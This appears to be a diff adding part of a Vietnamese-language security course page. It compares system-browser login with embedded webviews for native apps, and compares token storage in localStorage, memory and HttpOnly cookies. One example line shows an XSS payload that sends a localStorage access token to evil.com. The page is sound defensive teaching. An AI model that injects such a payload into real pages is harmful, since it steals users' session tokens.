+<tr><td>Là gì</td><td>Trình duyệt mặc định / ASWebAuthenticationSession / Custom Tabs</td><td>Khung trình duyệt nhúng trong app (WebView2, WKWebView)</td></tr>
+<tr><td>App đọc được mật khẩu?</td><td>Không</td><td><b>Có thể</b>: app kiểm soát cả webview</td></tr>
+<tr><td>SSO với phiên trình duyệt</td><td>Có</td><td>Không (cookie riêng)</td></tr>
+<tr><td>Passkey, chính sách IdP</td><td>Hỗ trợ tốt</td><td>Thường hạn chế; Google chặn đăng nhập trong webview</td></tr>
+<tr><td>Khuyến nghị</td><td>RFC 8252 (OAuth for Native Apps) khuyên dùng</td><td>Tránh cho đăng nhập</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> App WPF của Kaopiz mở trình duyệt hệ thống tới Keycloak, nhận code qua redirect <code>http://127.0.0.1:port/</code> (loopback) rồi đổi token với PKCE. Người dùng thấy đúng thanh địa chỉ thật và dùng lại được phiên đăng nhập sẵn có.</p>
+<span class="rule">Đăng nhập trong trình duyệt hệ thống: app không chạm vào mật khẩu, người dùng thấy đúng địa chỉ thật.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m07-2-native-s2s.html#desktop">Bài 7.2 — Desktop / Native</a> và <a href="m07-3-provisioning-wpf.html#wpf-points">Bài 7.3 — Ví dụ WPF</a></p>
+</div>
+
+<div class="compare" id="token-storage-compare"><span class="compare-title">localStorage vs Memory vs HttpOnly cookie</span>
+<div class="table-wrap"><table>
+<thead><tr><th>Tiêu chí</th><th>localStorage / sessionStorage</th><th>Memory (biến JS)</th><th>Cookie HttpOnly</th></tr></thead>
+<tbody>
+<tr><td>JavaScript đọc được?</td><td>Có — XSS lấy ra được</td><td>Có trong lúc chạy, khó lấy hơn nhưng XSS vẫn dùng được</td><td><b>Không</b></td></tr>
+<tr><td>Sống qua F5?</td><td>Có</td><td>Không (cần silent refresh/refresh token)</td><td>Có</td></tr>
+<tr><td>Tự gửi kèm request</td><td>Không</td><td>Không</td><td>Có → cần chống CSRF (SameSite)</td></tr>
+<tr><td>Đánh giá</td><td>Tránh cho token</td><td>Chấp nhận được cho SPA thuần</td><td>Tốt nhất, thường đi với BFF</td></tr>
+</tbody></table></div>
+<p><b>Ví dụ:</b> Một đoạn XSS chỉ cần <code>fetch('https://evil.com?t='+localStorage.access_token)</code> là token đã ra ngoài. Với cookie <code>HttpOnly; Secure; SameSite=Lax</code>, đoạn script đó không đọc được gì.</p>
+<span class="rule">Không có nơi nào trong trình duyệt an toàn tuyệt đối trước XSS; HttpOnly cookie chỉ ngăn <b>lấy token mang đi</b>.</span>
+<p>📚 <b>Học kỹ:</b> <a href="m06-5-password-token-storage.html#token-storage">Bài 6.5 — Token storage trong browser</a></p>
+</div>
+
+</main>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="assets/pages.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
